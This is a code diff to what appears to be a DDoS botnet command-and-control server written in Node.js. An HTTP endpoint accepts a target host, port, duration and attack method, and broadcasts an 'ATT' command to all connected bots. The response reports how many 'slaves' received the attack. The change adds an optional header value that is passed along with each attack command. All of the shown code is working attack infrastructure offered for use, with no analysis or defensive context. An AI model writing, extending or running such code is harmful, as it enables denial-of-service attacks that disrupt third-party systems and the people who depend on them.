@@ -30,13 +30,16 @@ const validateAttack = (data = {}) => {
             .uppercase()
             .valid(...METHODS)
             .required(),
+        header: Joi.string().min(4),
     })
     return schema.validate(data)
 }
 
-const sendAttack = (method, host, port, time) => {
+const sendAttack = (method, host, port, time, header = undefined) => {
     for (let client of clients) {
-        client.write(`ATT|${method}|${host}|${port}|${time}`)
+        let writeString = `ATT|${method}|${host}|${port}|${time}`
+        if (header) writeString += `|${header}`
+        client.write(writeString)
     }
 }
 
@@ -51,12 +54,12 @@ console.log(
 app.get("/", (req, res) => {
     const { error } = validateAttack(req.query)
     if (error) return res.status(400).send(error.details[0].message)
-    let { host, port, time, method } = req.query
+    let { host, port, time, method, header } = req.query
     method = method.toUpperCase()
 
     if (!METHODS.includes(method))
         return res.status(404).send("method does not exist")
-    sendAttack(method, host, port, time)
+    sendAttack(method, host, port, time, header)
     return res.send(`attack sent to ${clients.length} slaves.`)
 })
 
